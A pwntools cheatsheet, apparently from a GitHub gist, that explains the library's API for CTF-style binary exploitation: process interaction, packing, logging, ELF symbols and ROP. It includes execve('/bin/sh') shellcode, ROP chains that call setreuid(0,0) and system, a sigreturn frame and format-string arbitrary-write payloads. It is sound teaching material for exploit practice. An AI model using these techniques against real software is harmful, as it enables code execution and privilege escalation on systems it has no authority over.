# Pwntools Cheatsheet

##
#
https://gist.githubusercontent.com/anvbis/64907e4f90974c4bdd930baeb705dedf/raw/8b3d00bfd9be467eecb81adcfd886ca41de9be4a/pwntools-cheatsheet.md
#
##

 1. [Program Interaction](#program-interaction)
 2. [Environment and Contexts](#environment-and-contexts)
 3. [Logging and Output](#logging-and-output)
 4. [Encoding, Packing and Utility](#encoding-packing-and-utility)
 5. [Assembly and Shellcraft](#assembly-and-shellcraft)
 6. [ELFs, Strings and Symbols](#elfs-strings-and-symbols)
 7. [Return Oriented Programming](#return-oriented-programming)
 8. [SROP and Sigreturn Frames](#srop-and-sigreturn-frames)
 9. [Format String Exploits](#format-string-exploits)


<a name="program-interaction"></a>
## 1. Program Interaction

```py
# process objects can be created from a local binary, or created
# from a remote socket
p = process('./target')
p = remote('127.0.0.1', 1337)
```

```py
# environment variables and command line arguments can also be passed
# to the target binary at runtime
p = process(['./target', '--arg1', 'some data'], env={'env1': 'some data'})
```

```py
# you can attach a gdb instance to your already running process
p = process('./target')
gdb.attach(p)

# you can also start the process running under gdb, disable ASLR,
# and send gdb script at startup
p = gdb.debug('./target', aslr=False, gdbscript='b *main+123')
```

```py
# writing data to the process `stdin`
p.write(b'aaaa')      # p.send(b'aaaa')
p.writeline(b'aaaa')  # p.sendline(b'aaaa'), p.write(b'aaaa' + b'\n')

# reading data from the process `stdout`
p.read(123)                 # p.recv(123)
p.readline()                # p.recvline(), p.readuntil('\n')
p.readuntil('some string')  # p.recvuntil('some string')
p.readall()                 # p.recvall()
p.clean(1)                  # like `readall` but with a timeout

# p.readuntil('some string') ; p.write(b'aaaa')
p.writeafter('some string', b'aaaa')  # p.sendafter('some string', b'aaaa')

# p.readuntil('some string') ; p.writeline(b'aaaa')
p.writelineafter('some string', b'aaaa')  # p.sendlineafter('some string', b'aaaa')

# interacting with the process manually
p.interactive()

# waiting for the process to finish
p.wait()
```

```py
# you can also use pwntools tubes in python's `with` specifier
with process('./target') as p:
    # interact with process here, when done `p.close()` is called
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="environment-and-contexts"></a>
## 2. Environment and Contexts

```py
# this list of context values is not exhaustive, these are
# just the ones that I use the most often

# target architecture (default 'i386')
# valid values are 'aarch64', 'arm', 'i386', and 'amd64'
# note that this is very important when writing assembly,
# packing integers, and when building rop chains
context.arch = 'amd64'

# endianness (default 'little')
# valid values are 'big', and 'little'
context.endian = 'big'

# log verbosity (default 'info')
# valid values are 'debug', 'info', 'warn', and 'error'
context.log_level = 'error'

# signedness (default 'unsigned')
# valid values are 'unsigned', and 'signed'
context.sign = 'signed'
```

```py
# you can also update multiple context values at once with the 
# `clear` or `update` functions
context.clear(arch='amd64', log_level='error')
context.update(arch='amd64', log_level='error')
```

```py
# pwntools also allows you to use what are called 'scoped'
# contexts, utilising python's `with` specifier
with context.local(log_level='error'):
    # do stuff
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="logging-and-output"></a>
## 3. Logging and Output

```py
# the most basic logging utilities are below
log.warn('a warning message')     # -> [!] a warning message
log.info('some information')      # -> [*] some information
log.debug('a debugging message')  # -> [DEBUG] a debugging message
```

```py
# logging errors will trigger an exception in addition
# to printing some output
log.error('an error occurred')

'''
[ERROR] an error occurred
---------------------------------------------------------------------------
PwnlibException                           Traceback (most recent call last)
<ipython-input-10-5fe862ad5f5b> in <module>
----> 1 log.error('an error occurred')

/usr/local/lib/python3.9/dist-packages/pwnlib/log.py in error(self, message, *args, **kwargs)
    422         """
    423         self._log(logging.ERROR, message, args, kwargs, 'error')
--> 424         raise PwnlibException(message % args)
    425 
    426     def exception(self, message, *args, **kwargs):

PwnlibException: an error occurred
'''
```

```py
# debug messages work a little differently than the
# other log levels, by default they're disabled
context.log_level = 'debug'

# they will also trigger on a lot of normal functions
# if the log level is set to debug
asm('nop')

'''
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python3.9/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    nop
[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-gl2k0o4t/step2 /tmp/pwn-asm-gl2k0o4t/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-gl2k0o4t/step3 /tmp/pwn-asm-gl2k0o4t/step4
'''
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="encoding-packing-and-utility"></a>
## 4. Encoding, Packing and Utility

```py
# pwntools provides functions for converting to / from
# hexadecimal representations of byte strings
enhex(b'/flag')      # = '2f666c6167'
unhex('2f666c6167')  # = b'/flag'

# pwntools provides functions for converting to / from
# base64 representations of byte strings
b64e(b'/flag')    # = 'L2ZsYWc='
b64d('L2ZsYWc=')  # = b'/flag'
```

```py
# you can also find functions for calculating md5 and sha1
# hashes within the pwntools library
md5sumhex(b'hello')         # = '5d41402abc4b2a76b9719d911017c592'
md5filehex('./some-file')   # = '2b00042f7481c7b056c4b410d28f33cf'
sha1sumhex(b'hello')        # = 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d'
sha1filehex('./some-file')  # = '7d97e98f8af710c7e7fe703abc8f639e0ee507c4'
```

```py
# converting from integer representations
p8(0x41)                 # = b'\x41'
p16(0x4142)              # = b'\x42\x41'
p32(0x41424344)          # = b'\x44\x43\x42\x41'
p64(0x4142434445464748)  # = b'\x48\x47\x46\x45\x44\x43\x42\x41'

# converting to integer representations
u8(b'\x41')                               # = 0x41
u16(b'\x42\x41')                          # = 0x4142
u32(b'\x44\x43\x42\x41')                  # = 0x41424344
u64(b'\x48\x47\x46\x45\x44\x43\x42\x41')  # = 0x4142434445464748
```

```py
# you can also specify endianness with the (un)packing functions
p64(0x4142434445464748, endian='big')                   # = b'\x41\x42\x43\x44\x45\x46\x47\x48
u64(b'\x41\x42\x43\x44\x45\x46\x47\x48', endian='big')  # = 0x4142434445464748
```

```py
# pwntools also provides a `pack` and `unpack` functions for data of
# atypical or unusual length
pack(0x414243, 24)           # = b'\x43\x42\x41'
unpack(b'\x41\x42\x43', 24)  # = 0x434241
```

```py
# a leak we've captured from the process `stdout`
leak = b'0\xe1u65\x7f'

# we can use pwntools' `unpack` function to convert it to
# an integer representation
leak = unpack(leak, 'all')  # leak = 139866523689264 = 0x7f353675e130
```

```py
# pwntools also provides functions for generating cyclic sequences
# of bytes to find various offsets in memory
cyclic(16)       # = b'aaaabaaacaaadaaa'
cyclic(16, n=8)  # = b'aaaaaaaabaaaaaaa'

cyclic_find(0x61616164)               # = 12
cyclic_find(0x6161616161616162, n=8)  # = 8
```

```py
# you can also print hexdumps of byte strings
print(hexdump(data))

'''
00000000  65 4c b6 62  da 4f 1d 1b  d8 44 a6 59  a3 e8 69 2c  │eL·b│·O··│·D·Y│··i,│
00000010  09 d8 1c f2  9b 4a 9e 94  14 2b 55 7c  4e a8 52 a5  │····│·J··│·+U|│N·R·│
00000020
'''
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="assembly-and-shellcraft"></a>
## 5. Assembly and Shellcraft

The shellcraft module is massive, so maybe just [read the documentation](https://pwntools.readthedocs.io/en/latest/shellcraft.html).

```py
# you can write shellcode using the `asm` function
shellcode = asm('''
execve:
    lea rdi, [rip+bin_sh]
    mov rsi, 0
    mov rdx, 0
    mov rax, SYS_execve
    syscall
bin_sh:
    .string "/bin/sh"
''')

# assembly needs to be converted into bytes in order
# to be sent as part of a payload
payload = bytes(shellcode)
```

```py
# here's some assembly for a basic `execve("/bin/sh")` shellcode
shellcode = asm('''
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, SYS_execve
syscall
''')

# another way to represent this would be to use pwntools' shellcraft
# module, of which there are so many ways to do so
shellcode = shellcraft.pushstr('/bin/sh')
shellcode += shellcraft.syscall('SYS_execve', 'rsp', 0, 0)

payload = bytes(asm(shellcode))
```

```py
# or maybe you can just use pwntools' `sh` template
shellcode = shellcraft.sh()
payload = bytes(asm(shellcode))
```

```py
# you can also use gdb to debug shellcode
shellcode = '''
execve:
    lea rdi, [rip+bin_sh]
    mov rsi, 0
    mov rdx, 0
    mov rax, SYS_execve
    syscall
bin_sh:
    .string "/bin/sh"
'''

# converting the shellcode we wrote to an elf
elf = ELF.from_assembly(shellcode)
p = gdb.debug(elf.path)
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="elfs-strings-and-symbols"></a>
## 6. ELFs, Strings and Symbols

```py
# `ELF` objects are instantiated by providing a file name
elf = ELF('./target')
```

```py
# accessing symbols via location
elf.plt  # contains all symbols located in the PLT
elf.got  # contains all symbols located in the GOT

# elf.sym contains all known symbols, with preference
# given to the PLT over the GOT
elf.sym

# e.g. getting the address of the `puts` function
puts = elf.plt.puts  # equivalent to elf.sym['puts']
```

```py
libc = ELF('./libc.so.6')

old_puts = libc.sym.puts  # = 0x875a0

# you can modify the base address of the elf by setting its
# address parameter
libc.address = 0xdeadbeef000

# symbol locations will now be calculated relative to that
# base address provided
new_puts = libc.sym.puts  # 0xdeadbf765a0 = 0xdeadbeef + 0x875a0
```

```py
libc = ELF('./libc.so.6')

# you can even find strings in elf files with the `search` function
bin_sh = next(elf.search(b'/bin/sh'))
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="return-oriented-programming"></a>
## 7. Return Oriented Programming

```py
# `ROP` objects are instantiated using an `ELF` object
elf = ELF('./target')
rop = ROP(elf)
```

```py
# specific gadgets can be found using the `find_gadget` function
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address

# another alternative for simple `pop reg; ret` gadgets
pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address
```

```py
pop_rax = 0xdeadbeef
syscall = 0xcafebabe

# the below is equivalent to `p64(pop_rax) + p64(59) + p64(syscall)`,
# when converted to bytes
rop.raw(pop_rax)
rop.raw(59)
rop.raw(syscall)
```

```py
rop.call(elf.sym.puts, [0xdeadbeef])

# the above `call` function is equivalent to
rop.raw(rop.rdi.address)  # pop rdi; ret
rop.raw(0xdeadbeef)
rop.raw(elf.sym.puts)
```

```py
# rop chains can also be built on top of libc, rather than your
# target binary
libc = ELF('./libc.so.6')
libc.address = 0xdeadbeef  # setting the base address of libc

bin_sh = next(libc.search(b'/bin/sh'))

# note that this rop chain will use gadgets found in libc
rop = ROP(libc)

# you can also directly call elf symbols (if they're available in) 
# the elf) instead of using pwntools' `call` function
rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])
```

```py
# converting the rop chain to bytes in order to send it as
# a payload
payload = rop.chain()
```

```py
# printing the rop chain generated by pwn tools
print(rop.dump())
```

[^ Back to top](#file-pwntools-cheatsheet-md)

<a name="srop-and-sigreturn-frames"></a>
## 8. SROP and Sigreturn Frames

```py
# address of a syscall instruction
syscall = 0xdeadbeef

# address of a "/bin/sh" string
bin_sh = 0xcafebabe

# instatiating a sigreturn frame object
frame = SigreturnFrame()

# setting values of registers (set rip as address to return to)
frame.rax = constants.SYS_execve
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
```

```py
# the sigreturn frame will need to be converted to bytes prior
# to being sent as part of a payload
payload = bytes(frame)
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="format-string-exploits"></a>
## 9. Format String Exploits

```py
# the format string offset
offset = 5

# the writes you want to perform
writes = {
    0x40010: 0xdeadbeef,  # write 0xdeadbeef at 0x40010
    0x40018: 0xcafebabe   # write 0xcafebabe at 0x40018
}

# you can use the `fmtstr_payload` function to automatically
# generate a payload that performs the writes you specify
payload = fmtstr_payload(offset, writes)
p.writeline(payload)
```

```py
# if data is written by the vulnerable function at the start of
# your payload, you can specify the number of bytes written
payload = fmtstr_payload(offset, writes, numbwritten=8)
p.writeline(payload)
```

```py
p = process('./target')

# you will need to define a function that sends your payload to
# the target, and returns the value output by the target
def send_data(payload):
    p.sendline(payload)
    return p.readall()

# automatic calculation of the format string offset
fmt_str = FmtStr(execute_fmt=send_data)
offset = fmt_str.offset
```

```py
# you can also use the `FmtStr` object to perform your writes
fmt_str = FmtStr(execute_fmt=send_data)
fmt_str.write(0x40010, 0xdeadbeef)  # write 0xdeadbeef at 0x40010
fmt_str.write(0x40018, 0xcafebabe)  # write 0xcafebabe at 0x40018
fmt_str.execute_writes()
```

[^ Back to top](#file-pwntools-cheatsheet-md)
